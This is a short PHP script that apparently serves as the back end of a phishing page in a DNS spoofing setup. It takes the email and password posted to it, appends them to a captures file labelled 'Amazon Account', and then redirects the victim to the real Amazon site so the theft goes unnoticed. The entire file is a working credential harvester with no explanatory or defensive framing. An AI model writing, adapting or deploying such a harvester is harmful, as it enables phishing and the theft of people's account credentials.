<?php

file_put_contents("/root/rpi_gui_map/DNSSpoof/captures/usernames.txt", "Amazon Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.amazon.com');
exit();
